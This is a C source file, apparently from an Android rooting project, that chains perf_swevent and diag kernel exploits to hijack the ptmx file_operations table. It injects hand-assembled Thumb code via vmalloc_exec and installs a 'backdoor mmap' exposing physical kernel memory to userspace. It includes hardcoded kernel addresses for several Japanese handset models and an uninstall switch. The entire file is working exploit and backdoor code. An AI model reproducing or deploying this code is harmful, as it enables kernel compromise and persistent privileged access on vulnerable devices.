#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <fcntl.h>
#define _LARGEFILE64_SOURCE

#include "detect_device.h"
#include "perf_swevent.h"
#include "ptmx.h"
#include "mm.h"
#include "libdiagexploit/diag.h"
#include "backdoor_mmap.h"

#define PAGE_SHIFT        12

#define USE_THUMB_INSN    true
#define USE_ASM_DO_MAP

#ifdef USE_ASM_DO_MAP
#define sizeof_do_mmap()  sizeof (do_mmap)

typedef struct _supported_device {
  int device_id;
  unsigned long int kernel_phys_offset;
  unsigned long int vmalloc_exec_address;
} supported_device;

static supported_device supported_devices[] = {
  { DEV_IS17SH_01_00_04,    0x00208000, 0xc0212b70 },
  { DEV_SH04E_01_00_02,     0x80208000, 0xc00f10d4 },
  { DEV_SOL21_9_1_D_0_395,  0x80208000, 0xc011aeec },
  { DEV_HTL21_JRO03C,       0x80608000, 0xc010b728 },
  { DEV_ISW13F_V69R51I,     0x80008000, 0xc01294b0 },  // not tested yet
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static unsigned long int kernel_phys_offset;
static void *(*vmalloc_exec)(unsigned long size);
static int (*remap_pfn_range)(struct vm_area_struct *, unsigned long addr,
                              unsigned long pfn, unsigned long size, pgprot_t);

/*

/proc/iomem for IS17SH:

  ...
00200000-03dfffff : System RAM
  00300000-00b381ef : Kernel text
  00c00000-0120cd77 : Kernel data
  ...

Actual kernel text offset is 0x00208000, this is from boot image header.

*/

static unsigned long int
find_kernel_text_from_iomem(void)
{
  unsigned long int kernel_ram;
  FILE *fp;

  fp = fopen("/proc/iomem", "rt");
  if (!fp) {
    return 0;
  }

  kernel_ram = 0;

  while (!feof(fp)) {
    unsigned long int start, end;
    char buf[256];
    char *p;
    int len;
    char colon[256], name1[256], name2[256];
    int n;

    p = fgets(buf, sizeof (buf) - 1, fp);
    if (p == NULL)
      break;

    if (sscanf(buf, "%lx-%lx %s %s %s", &start, &end, colon, name1, name2) != 5
        || strcmp(colon, ":")) {
      continue;
    }

    if (!strcasecmp(name1, "System") && !strcasecmp(name2, "RAM")) {
      kernel_ram = start;
      continue;
    }

    if (strcasecmp(name1, "Kernel") || strcasecmp(name2, "text")) {
      kernel_ram = 0;
      continue;
    }

    fclose(fp);
    return kernel_ram + 0x00008000;
  }

  fclose(fp);
  return 0;
}

static bool
setup_variables(void)
{
  int device_id = detect_device();
  int i;

  kernel_phys_offset = 0;
  vmalloc_exec = 0;

  for (i = 0; i < n_supported_devices; i++) {
    if (supported_devices[i].device_id == device_id) {
      kernel_phys_offset = supported_devices[i].kernel_phys_offset;
      vmalloc_exec = (void *)supported_devices[i].vmalloc_exec_address;
    }
  }

  if (!kernel_phys_offset) {
    kernel_phys_offset = find_kernel_text_from_iomem();
    if (kernel_phys_offset) {
      printf("Kernel physical offset is detected as 0x%08lx from /proc/iomem.\n"
             "If it crashed with this address, setup correct address\n",
             kernel_phys_offset);
    }
  }

  if (!vmalloc_exec) {
    vmalloc_exec = (void *)kallsyms_get_symbol_address("vmalloc_exec");
  }

  if (kernel_phys_offset && vmalloc_exec) {
    return true;
  }

  print_reason_device_not_supported();
  return false;
}

unsigned short do_mmap[] =
{
  0xb510, //    push    {r4, lr}
  0x684a, //    ldr     r2, [r1, #4]
  0x688b, //    ldr     r3, [r1, #8]
  0x6948, //    ldr     r0, [r1, #20]
  0xb082, //    sub     sp, #8
  0x1a9b, //    subs    r3, r3, r2
  0x9000, //    str     r0, [sp, #0]
  0x4c03, //    ldr     r4, [pc, #12]   ; (927c <do_mmap+0x1c>)
  0x1c08, //    adds    r0, r1, #0
  0x1c11, //    adds    r1, r2, #0
  0x4a02, //    ldr     r2, [pc, #8]    ; (9280 <do_mmap+0x20>)
  0x47a0, //    blx     r4
  0xb002, //    add     sp, #8
  0xbd10, //    pop     {r4, pc}

          // <do_mmap+0x1c>:            ; remap_pfn_range
  0xbeef,
  0xdead,
          // <do_mmap+0x20>:            ; KERNEL_PHY_BASE
  0xface,
  0xbabe
};

#else
int do_mmap(struct file *filp, struct vm_area_struct *vma);
int sizeof_do_mmap(void);
#endif

static void *install_fops_address;
static bool install_mmap_success = false;

void
install_mmap(void)
{
  void **install_fops_mmap_address;
  void *install_mmap_address;
  void **func_address;
  size_t func_size;

  install_mmap_success = false;

  install_fops_mmap_address = install_fops_address + 0x28;
  if (*install_fops_mmap_address) {
    return;
  }

  func_size = sizeof_do_mmap();

  func_address = vmalloc_exec(func_size);
  if (!func_address) {
    return;
  }

  memcpy(func_address, do_mmap, func_size);

  func_address[func_size / sizeof (void *) - 2] = (void *)remap_pfn_range;
  func_address[func_size / sizeof (void *) - 1] = (void *)(kernel_phys_offset >> PAGE_SHIFT);

  *install_fops_mmap_address = (void *)func_address + (USE_THUMB_INSN ? 1 : 0);
  install_mmap_success = true;
}

static bool
run_install_mmap(void *user_data)
{
  int fd;

  install_fops_address = user_data;

  fd = open(PTMX_DEVICE, O_WRONLY);
  fsync(fd);
  close(fd);

  printf("install_mmap: %s\n", install_mmap_success ? "success" : "failed");

  return install_mmap_success;
}

#ifndef USE_ASM_DO_MAP
typedef int (*remap_pfn_range_func_t)(struct vm_area_struct *, unsigned long addr,
                         unsigned long pfn, unsigned long size, pgprot_t);

int
do_mmap(struct file *filp, struct vm_area_struct *vma)
{
  remap_pfn_range_func_t func = (void *)0xdeadbeef;

  return func(vma, vma->vm_start, 0xbabeface, vma->vm_end - vma->vm_start, vma->vm_page_prot);
}

int
sizeof_do_mmap(void)
{
  return (void *)sizeof_do_mmap - (void *)do_mmap;
}
#endif

static bool
attempt_diag_exploit(unsigned long int address, void *user_data)
{
  struct diag_values injection_data;

  injection_data.address = address;
  injection_data.value = (uint16_t)&install_mmap;

  return diag_run_exploit(&injection_data, 1,
                          run_install_mmap, user_data);
}

static bool
run_exploit(void)
{
  unsigned long int ptmx_fsync_address;
  unsigned long int ptmx_fops_address;

  ptmx_fops_address = get_ptmx_fops_address();
  if (!ptmx_fops_address) {
    return false;
  }

  ptmx_fsync_address = ptmx_fops_address + 0x38;

  printf("Attempt perf_swevent exploit...\n");
  if (perf_swevent_run_exploit(ptmx_fsync_address, (int)&install_mmap,
                                  run_install_mmap, (void *)ptmx_fops_address)) {
    return true;
  }

  printf("Attempt diag exploit...\n");
  if (attempt_diag_exploit(ptmx_fsync_address, (void *)ptmx_fops_address)) {
    return true;
  }

  return false;
}

static bool
remove_backdoor_mmap(void)
{
  unsigned long int ptmx_fops_address;
  unsigned long int *fops_mmap_address;

  ptmx_fops_address = get_ptmx_fops_address();
  if (!ptmx_fops_address) {
    return false;
  }

  fops_mmap_address = backdoor_convert_to_mmaped_address((void *)ptmx_fops_address + 0x28);
  *fops_mmap_address = 0;

  return true;
}

int
main(int argc, char **argv)
{
  if (argc == 2 && strcmp(argv[1], "-u") == 0) {
    if (backdoor_open_mmap()) {
      remove_backdoor_mmap();
      backdoor_close_mmap();
      exit(EXIT_SUCCESS);
    }
    else {
      printf("You have not installed backdoor mmap yet.\n");
      exit(EXIT_FAILURE);
    }
  }

  if (backdoor_open_mmap()) {
    backdoor_close_mmap();
    printf("You have already installed backdoor mmap.\n");
    exit(EXIT_FAILURE);
  }

  if (!setup_variables()) {
    exit(EXIT_FAILURE);
  }

  remap_pfn_range = get_remap_pfn_range_address();
  if (!remap_pfn_range) {
    printf("You need to manage to get remap_pfn_range addresses.\n");
    exit(EXIT_FAILURE);
  }

  if (!run_exploit()) {
    exit(EXIT_FAILURE);
  }

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
